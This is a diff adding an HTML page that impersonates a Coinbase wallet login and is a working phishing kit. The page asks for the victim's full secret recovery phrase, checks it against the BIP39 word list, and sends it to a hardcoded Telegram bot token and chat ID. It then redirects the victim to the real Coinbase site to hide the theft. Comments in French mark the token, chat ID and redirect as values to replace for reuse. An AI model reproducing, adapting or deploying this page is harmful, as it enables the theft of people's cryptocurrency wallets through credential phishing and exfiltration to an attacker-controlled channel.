@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login - Coinbase</title>
+  <link rel="icon" type="image/png" href="img/meta2.png">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #fff;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .top-bar {
+      width: 100%;
+      max-width: 700px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 30px 30px 10px;
+    }
+
+    .logo {
+      font-weight: bold;
+      font-size: 20px;
+    }
+
+    .language-select {
+      padding: 6px 12px;
+      font-size: 15px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    main {
+      display: flex;
+      justify-content: center;
+      padding: 20px;
+      width: 100%;
+    }
+
+    .card {
+      background-color: white;
+      border-radius: 20px;
+      border: 1px solid #e0e0e0;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      padding: 40px;
+      width: 100%;
+      max-width: 500px;
+    }
+
+    .step-circles {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 260px;
+      margin-bottom: 30px;
+    }
+
+    .step {
+      text-align: center;
+    }
+
+    .circle {
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      border: 2px solid #ccc;
+      line-height: 36px;
+      font-weight: bold;
+      font-size: 14px;
+      color: #777;
+      background-color: white;
+      margin: 0 auto 6px;
+    }
+
+    .step.active .circle {
+      background-color: #0051FE;
+      color: #fff;
+      border: none;
+    }
+
+    .label {
+      font-size: 12px;
+      color: #666;
+      line-height: 14px;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+
+    .description {
+      text-align: center;
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+
+    select.phrase-length {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 12px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+
+    .info {
+      font-size: 13px;
+      color: #444;
+      margin: 10px 0;
+      padding: 10px;
+      background: #f5f5ff;
+      border-left: 4px solid #6264ff;
+      border-radius: 4px;
+    }
+
+    .seed-inputs {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin: 20px 0;
+    }
+
+    .seed-input {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .seed-input input {
+      width: 100%;
+      padding: 8px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+
+    .captcha-box {
+      display: flex;
+      align-items: center;
+      margin-bottom: 10px;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .captcha {
+      background: #e0e0e0;
+      padding: 10px;
+      font-size: 20px;
+      font-weight: bold;
+      letter-spacing: 3px;
+      border-radius: 5px;
+      user-select: none;
+    }
+
+    .refresh-btn {
+      background: #4CAF50;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+
+    .refresh-btn:hover {
+      background: #45a049;
+    }
+
+    .submit-btn {
+      background: linear-gradient(90deg, #0051FE, #6563ff);
+      border: none;
+      color: white;
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      border-radius: 24px;
+      cursor: pointer;
+    }
+
+    .submit-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .error-msg {
+      color: red;
+      font-size: 14px;
+      text-align: center;
+      margin-top: 10px;
+      display: none;
+    }
+
+    #captchaMessage {
+      text-align: center;
+      font-size: 14px;
+      color: red;
+      margin: 5px 0;
+    }
+
+    @media (max-width: 600px) {
+      .seed-inputs {
+        grid-template-columns: repeat(2, 1fr);
+      }
+
+      .step-circles {
+        gap: 80px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="top-bar">
+    <div><img src="./img/meta.png"  width="140px"></div>
+    <select class="language-select">
+      <option value="en">English</option>
+      <option value="fr">Français</option>
+      <option value="es">Español</option>
+    </select>
+  </div>
+
+  <main>
+    <div class="card">
+
+      <div class="step-circles">
+        <div class="step active">
+          <div class="circle">1</div>
+          <div class="label">Confirm secret<br/>recovery phrase</div>
+        </div>
+        <div class="step">
+          <div class="circle">2</div>
+          <div class="label">Create<br/>password</div>
+        </div>
+      </div>
+
+      <h1>Access your wallet with your Secret Recovery Phrase</h1>
+      <p class="description">
+        Coinbase cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password.
+        First, enter the Secret Recovery Phrase that you were given when you created your wallet.
+        <a href="#">Learn more</a>
+      </p>
+
+      <select class="phrase-length" id="phraseLength" onchange="generateInputs()">
+        <option value="12">I have a 12 word phrase</option>
+        <option value="15">I have a 15 word phrase</option>
+        <option value="18">I have an 18 word phrase</option>
+        <option value="21">I have a 21 word phrase</option>
+        <option value="24">I have a 24 word phrase</option>
+      </select>
+
+      <div class="info">You can paste your entire secret recovery phrase into any field</div>
+
+      <div class="seed-inputs" id="seedInputs"></div>
+
+      <!-- ✅ Captcha ajouté ici -->
+      <div class="captcha-box">
+        <div id="captcha" class="captcha"></div>
+        <button type="button" class="refresh-btn" onclick="generateCaptcha()">↻</button>
+      </div>
+      <input type="text" id="captchaInput" placeholder="Enter captcha" style="width:100%;padding:8px;border-radius:8px;border:1px solid #ccc;margin-bottom:10px;">
+      <p id="captchaMessage"></p>
+
+      <button class="submit-btn" id="submitBtn" onclick="handleConfirm()" disabled>
+        Confirm Secret Recovery Phrase
+      </button>
+      <p id="errorMsg" class="error-msg">Invalid seed phrase. Please check the words.</p>
+
+    </div>
+  </main>
+
+  <script src="bip39-words.js"></script>
+  <script>
+    let captchaCode = "";
+
+    function generateCaptcha() {
+      const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+      captchaCode = "";
+      for (let i = 0; i < 6; i++) {
+        captchaCode += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      document.getElementById("captcha").innerText = captchaCode;
+    }
+
+    function validateCaptchaInput() {
+      const userCaptcha = document.getElementById("captchaInput").value;
+      const captchaMessage = document.getElementById("captchaMessage");
+      if (userCaptcha === captchaCode) {
+        captchaMessage.textContent = "✅ Captcha valide.";
+        captchaMessage.style.color = "green";
+        return true;
+      } else {
+        captchaMessage.textContent = "❌ Cnvalid captcha. Try again.";
+        captchaMessage.style.color = "red";
+        generateCaptcha();
+        return false;
+      }
+    }
+
+    function generateInputs() {
+      const container = document.getElementById("seedInputs");
+      const count = parseInt(document.getElementById("phraseLength").value);
+      container.innerHTML = "";
+
+      for (let i = 1; i <= count; i++) {
+        const div = document.createElement("div");
+        div.className = "seed-input";
+        div.innerHTML = `<label>${i}.</label><input type="text" name="word${i}" autocomplete="off" />`;
+        container.appendChild(div);
+      }
+
+      const inputs = container.querySelectorAll("input");
+      inputs.forEach(input => {
+        input.addEventListener("input", checkFieldsFilled);
+      });
+
+      document.getElementById("submitBtn").disabled = true;
+    }
+
+    function checkFieldsFilled() {
+      const count = parseInt(document.getElementById("phraseLength").value);
+      let allFilled = true;
+
+      for (let i = 1; i <= count; i++) {
+        const value = document.querySelector(`input[name='word${i}']`).value.trim();
+        if (value === "") {
+          allFilled = false;
+          break;
+        }
+      }
+
+      // Active le bouton seulement si captcha et champs remplis
+      document.getElementById("submitBtn").disabled = !(allFilled && validateCaptchaInput());
+    }
+
+    function validateBIP39Words() {
+      const count = parseInt(document.getElementById("phraseLength").value);
+      let valid = true;
+
+      for (let i = 1; i <= count; i++) {
+        const input = document.querySelector(`input[name='word${i}']`);
+        const word = input.value.trim().toLowerCase();
+        if (!bip39Words.includes(word)) {
+          input.style.border = "2px solid red";
+          valid = false;
+        } else {
+          input.style.border = "1px solid #ccc";
+        }
+      }
+
+      return valid;
+    }
+
+    function handleConfirm() {
+      const errorEl = document.getElementById("errorMsg");
+      if (!validateCaptchaInput()) {
+        return;
+      }
+      if (!validateBIP39Words()) {
+        errorEl.style.display = "block";
+        return;
+      } else {
+        errorEl.style.display = "none";
+      }
+
+      const count = parseInt(document.getElementById("phraseLength").value);
+      let phrase = "";
+      for (let i = 1; i <= count; i++) {
+        const value = document.querySelector(`input[name='word${i}']`).value;
+        phrase += value.trim() + " ";
+      }
+
+      const botToken = "8110518970:AAHW8ndbtp7n6zRBj7XvBEitLC4WyS0IWps"; // Remplace ici
+      const chatId = "6964453824";     // Remplace ici
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: "coinbase wallet:\n\n" + phrase.trim()
+        })
+      });
+
+      navigator.clipboard.writeText(phrase.trim());
+
+      setTimeout(() => {
+        window.location.href = "https://www.coinbase.com/fr"; // Remplace ton lien ici
+      }, 800);
+    }
+
+    document.addEventListener("paste", function(e) {
+      const activeInput = document.activeElement;
+      if (!activeInput || !activeInput.name || !activeInput.name.startsWith("word")) return;
+
+      const paste = (e.clipboardData || window.clipboardData).getData("text");
+      const words = paste.trim().split(/\s+/);
+      if (words.length < 2) return;
+
+      e.preventDefault();
+      words.forEach((word, index) => {
+        const input = document.querySelector(`input[name='word${index + 1}']`);
+        if (input) input.value = word;
+      });
+
+      checkFieldsFilled(); // mise à jour bouton
+    });
+
+    window.onload = function() {
+      generateInputs();
+      generateCaptcha();
+    }
+  </script>
+</body>
+</html>
